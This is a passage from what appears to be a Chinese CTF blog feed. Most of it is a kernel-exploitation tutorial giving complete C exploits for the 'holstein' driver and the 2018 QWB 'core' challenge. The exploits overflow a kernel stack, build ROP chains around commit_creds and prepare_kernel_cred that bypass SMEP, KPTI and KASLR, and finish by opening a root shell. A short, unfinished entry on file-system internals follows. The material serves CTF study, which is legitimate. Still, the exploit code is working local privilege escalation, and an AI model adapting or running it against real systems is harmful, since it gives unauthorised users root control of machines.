class="line"><span class="params">               <span class="string">&quot;movq %1, 0x18(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %2, 0x10(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %3, 0x08(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %4, 0x00(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;iretq&quot;</span></span></span><br><span class="line"><span class="params">               :</span></span><br><span class="line"><span class="params">               : <span class="string">&quot;r&quot;</span>(user_ss),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rsp),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rflags),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_cs), <span class="string">&quot;r&quot;</span>(win))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">escalate_privilege</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = (<span class="type">void</span>*)(prepare_kernel_cred);</span><br><span class="line">  <span class="type">void</span> (*cc)(<span class="type">char</span>*) = (<span class="type">void</span>*)(commit_creds);</span><br><span class="line">  (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">  restore_state();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_state();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;open(\&quot;/dev/holstein\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x410</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x410</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x408</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)&amp;escalate_privilege;</span><br><span class="line">  write(fd, buf, <span class="number">0x410</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实现2（smep保护）"><a href="#实现2（smep保护）" class="headerlink" title="实现2（smep保护）"></a>实现2（smep保护）</h2><blockquote>
<p>将学习如何利用kernel gadget</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh extract-vmlinux bzImage &gt; vmlinux</span><br><span class="line">ROPgadget --binary vmlinux --only &quot;pop|ret&quot;</span><br><span class="line">ROPgadget --binary vmlinux --only &quot;swapgs|ret&quot;</span><br><span class="line">ROPgadget --binary vmlinux --only &quot;mov|rep|ret&quot;</span><br><span class="line">objdump -S -M intel vmlinux | grep iretq</span><br><span class="line">ROPgadget --binary vmlinux |grep &quot;swapgs&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_rsp, user_rflags;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred 0xffffffff8106e240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds        0xffffffff8106e390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rdi               0xffffffff8127bbdc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rcx               0xffffffff8132cdd3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_swapgs                0xffffffff8160bf7e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_iretq                 0xffffffff810202af</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="type">char</span> *envp[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">      <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">      <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">      : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_state();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;open(\&quot;/dev/holstein\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x410</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x410</span>);</span><br><span class="line"><span class="comment">//  *(unsigned long*)&amp;buf[0x408] = (unsigned long)&amp;escalate_privilege;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *chain = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x408</span>];</span><br><span class="line">  *chain++ = rop_pop_rdi;</span><br><span class="line">  *chain++ = <span class="number">0x0</span>;</span><br><span class="line">  *chain++ = prepare_kernel_cred;</span><br><span class="line">  *chain++ = rop_pop_rcx;</span><br><span class="line">  *chain++ = <span class="number">0x0</span>;</span><br><span class="line">  *chain++ = rop_mov_rdi_rax_rep_movsq;</span><br><span class="line">  *chain++ = commit_creds;</span><br><span class="line">  *chain++ = rop_swapgs;</span><br><span class="line">  *chain++ = rop_iretq;</span><br><span class="line">  *chain++ = (<span class="type">unsigned</span> <span class="type">long</span>)&amp;win;</span><br><span class="line">  *chain++ = user_cs;</span><br><span class="line">  *chain++ = user_rflags;</span><br><span class="line">  *chain++ = user_rsp;</span><br><span class="line">  *chain++ = user_ss;</span><br><span class="line">  write(fd, buf, (<span class="type">void</span>*)chain - (<span class="type">void</span>*)buf);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实现3（KPTI保护）"><a href="#实现3（KPTI保护）" class="headerlink" title="实现3（KPTI保护）"></a>实现3（KPTI保护）</h2><blockquote>
<p>页表保护</p>
</blockquote>
<h3 id="如何检查："><a href="#如何检查：" class="headerlink" title="如何检查："></a>如何检查：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/devices/system/cpu/vulnerabilities/meltdown</span><br></pre></td></tr></table></figure>

<blockquote>
<p>利用<code>swapgs_restore_regs_and_return_to_usermode</code></p>
<p>或利用：signal(SIGSEGV, win);函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_rsp, user_rflags;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred 0xffffffff8106e240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds        0xffffffff8106e390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rdi               0xffffffff8127bbdc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rcx               0xffffffff8132cdd3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_swapgs                0xffffffff8160bf7e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_iretq                 0xffffffff810202af</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xFFFFFFFF81800E26</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="type">char</span> *envp[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">      <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">      <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">      : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_state();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;open(\&quot;/dev/holstein\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x410</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x410</span>);</span><br><span class="line"><span class="comment">//  *(unsigned long*)&amp;buf[0x408] = (unsigned long)&amp;escalate_privilege;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *chain = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x408</span>];</span><br><span class="line">  *chain++ = rop_pop_rdi;</span><br><span class="line">  *chain++ = <span class="number">0x0</span>;</span><br><span class="line">  *chain++ = prepare_kernel_cred;</span><br><span class="line">  *chain++ = rop_pop_rcx;</span><br><span class="line">  *chain++ = <span class="number">0x0</span>;</span><br><span class="line">  *chain++ = rop_mov_rdi_rax_rep_movsq;</span><br><span class="line">  *chain++ = commit_creds;</span><br><span class="line">  *chain++ = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">  *chain++ = <span class="number">0</span>;</span><br><span class="line">  *chain++ = <span class="number">0</span>;</span><br><span class="line">  *chain++ =  (<span class="type">unsigned</span> <span class="type">long</span>*)win;;</span><br><span class="line">  *chain++ = user_cs;</span><br><span class="line">  *chain++ = user_rflags;</span><br><span class="line">  *chain++ = user_rsp;</span><br><span class="line">  *chain++ = user_ss;</span><br><span class="line">  write(fd, buf, (<span class="type">void</span>*)chain - (<span class="type">void</span>*)buf);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实现4（KALSR保护）"><a href="#实现4（KALSR保护）" class="headerlink" title="实现4（KALSR保护）"></a>实现4（KALSR保护）</h2><blockquote>
<p>以强王杯2018 强网杯 core为例子</p>
<p><a href="https://eternalsakura13.com/2018/03/31/b_core/">https://eternalsakura13.com/2018/03/31/b_core/</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFF 0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COPY 0x6677889A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\033[32m\033[1m[+] %s\033[0m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fail</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\033[31m\033[1m[x] %s\033[0m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">debug</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\033[34m\033[1m[*] %s\033[0m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printvar</span><span class="params">(<span class="type">void</span> handle(<span class="type">const</span> <span class="type">char</span> *), <span class="type">char</span> *hint, <span class="type">size_t</span> var)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%s: 0x%lx\n&quot;</span>, hint, var);</span><br><span class="line">    handle(buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> commit_creds,prepare_kernel_cred,off,swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    user_sp &amp;= ~<span class="number">0xf</span>;</span><br><span class="line">    success(<span class="string">&quot;Status has been saved.\n&quot;</span>);</span><br><span class="line">    printvar(debug, <span class="string">&quot;cs&quot;</span>, user_cs);</span><br><span class="line">    printvar(debug, <span class="string">&quot;ss&quot;</span>, user_ss);</span><br><span class="line">    printvar(debug, <span class="string">&quot;rsp&quot;</span>, user_sp);</span><br><span class="line">    printvar(debug, <span class="string">&quot;rflags&quot;</span>, user_rflags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leakAddr</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (!commit_creds || !prepare_kernel_cred ) &#123;</span><br><span class="line">        <span class="type">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> t[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, name[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">fscanf</span>(kallsyms, <span class="string">&quot;%lx%s%s&quot;</span>, &amp;addr, t, name);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            off = commit_creds - <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line">            printvar(success, <span class="string">&quot;leak commit_creds&quot;</span>, addr);</span><br><span class="line">            printvar(debug, <span class="string">&quot;offset&quot;</span>, off);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            off = prepare_kernel_cred - <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line">            printvar(success, <span class="string">&quot;leak prepare_kernel_cred&quot;</span>, addr);</span><br><span class="line">            printvar(debug, <span class="string">&quot;offset&quot;</span>, off);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(kallsyms);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leakcanary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">    ioctl(fd, OFF, <span class="number">64</span>);</span><br><span class="line">    ioctl(fd, READ, buf);</span><br><span class="line">    canary = ((<span class="type">size_t</span>*)buf)[<span class="number">0</span>];</span><br><span class="line">    printvar(success, <span class="string">&quot;leak canaryadd&quot;</span>, canary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rdi               off + 0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rcx               off + 0xffffffff81021e53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rdx               off + 0xffffffff810a0f49 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_iretq                 off + 0xffffffff81050ac2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_swapgs                off + 0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_mov_rdi_rax_rep_movsq off + 0xffffffff814b15953</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_move_rdi_rax_pop_rbp_mov_rax_rdi_pop_r12_ret off + 0xffffffff813f9ede</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">()</span> &#123;</span><br><span class="line">    success(<span class="string">&quot;Backing from the kernelspace.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        fail(<span class="string">&quot;Failed to get the root!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success(<span class="string">&quot;Successful to get the root. Execve root shell now...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">// to exit the process normally instead of segmentation fault</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pwn</span><span class="params">()</span> &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    leakAddr();</span><br><span class="line">    leakcanary();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chain = <span class="built_in">calloc</span>(<span class="number">0x800</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *start = chain;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i!=<span class="number">8</span>;i++)&#123;</span><br><span class="line">        chain[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    chain = chain + <span class="number">8</span>;</span><br><span class="line">    *chain++ = canary;</span><br><span class="line">    *chain++ = canary;</span><br><span class="line">    *chain++ = rop_pop_rdi;</span><br><span class="line">    *chain++ = <span class="number">0x0</span>;</span><br><span class="line">    *chain++ = prepare_kernel_cred;</span><br><span class="line">    *chain++ = rop_move_rdi_rax_pop_rbp_mov_rax_rdi_pop_r12_ret;</span><br><span class="line">    *chain++ = <span class="number">0x0</span>;</span><br><span class="line">    *chain++ = <span class="number">0x0</span>;</span><br><span class="line">    *chain++ = commit_creds;</span><br><span class="line">    *chain++ = rop_swapgs;</span><br><span class="line">    *chain++ = <span class="number">0x0</span>;</span><br><span class="line">    *chain++ = rop_iretq;</span><br><span class="line">    *chain++ =  (<span class="type">unsigned</span> <span class="type">long</span>*)getRootShell;</span><br><span class="line">    *chain++ = user_cs;</span><br><span class="line">    *chain++ = user_rflags;</span><br><span class="line">    *chain++ = user_sp;</span><br><span class="line">    *chain++ = user_ss;</span><br><span class="line">    write(fd,start,<span class="number">0x800</span>);</span><br><span class="line">    ioctl(fd, COPY, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));<span class="comment">//利用整数溢出漏洞</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    pwn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>































]]></content>
      <categories>
        <category>ctf</category>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>os文件系统</title>
    <url>/2024/08/19/os%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F1/</url>
    <content><![CDATA[<blockquote>
<p>关于os持久化的一些学习</p>
</blockquote>
<h1 id="硬件基础（磁盘）"><a href="#硬件基础（磁盘）" class="headerlink" title="硬件基础（磁盘）"></a>硬件基础（磁盘）</h1><h2 id="几何结构"><a href="#几何结构" class="headerlink" title="几何结构"></a>几何结构</h2><h2 id="访问机制"><a href="#访问机制" class="headerlink" title="访问机制"></a>访问机制</h2><h2 id="RAID"><a href="#RAID" class="headerlink" title="RAID"></a>RAID</h2><h1 id="初始化与os访问机制（文件系统与挂载）"><a href="#初始化与os访问机制（文件系统与挂载）" class="headerlink" title="初始化与os访问机制（文件系统与挂载）"></a>初始化与os访问机制（文件系统与挂载）</h1><blockquote>
<p>磁盘进行格式化的方式无非就是加入一些元信息来让os实现软件式的数据交互与管理，初始化为不同的文件系统的类型有多种多样的管理方式，但是机制无非就那几种。</p>
<p>核心还是理解数据结构，算法的话，有多种多样的实现</p>
</blockquote>
<h2 id="文件系统的整体架构（以VSFS为例）"><a href="#文件系统的整体架构（以VSFS为例）" class="headerlink" title="文件系统的整体架构（以VSFS为例）"></a>文件系统的整体架构（以VSFS为例）</h2><blockquote>
<p>S:为文件系统挂载之后所需用来描述文件系统的一些核心信息，在ELF中类似于fileheader</p>
<p>i：inode位图，用来描述哪个inode为空</p>
<p>d：数据位图，用来描述哪个数据块为空</p>
<p>inodes：在每个inode中，实际上是所有关于文件的信息：文件类型（例如，常规文件、目录等）、大小、分配给它的块数、保护信息（如谁拥有该文件以及谁可以访问它）、一些时间信息（包括文件创建、修改或上次访问的时间文件下），以及有关其数据块驻留在磁盘上的位置的信息（如某种类型的指针）。我们将所有关于文件的信息称为元数据（metadata）。实际上，文件系统中除了纯粹的用户数据外，其他任何信息通常都称为元数据。</p>
</blockquote>
<p><img src="/../../themes/butterfly/source/img/mypic/os/fs.png" alt="image-20240827165948907"></p>
<h2 id="inode机制"><a href="#inode机制" class="headerlink" title="inode机制"></a>inode机制</h2><blockquote>
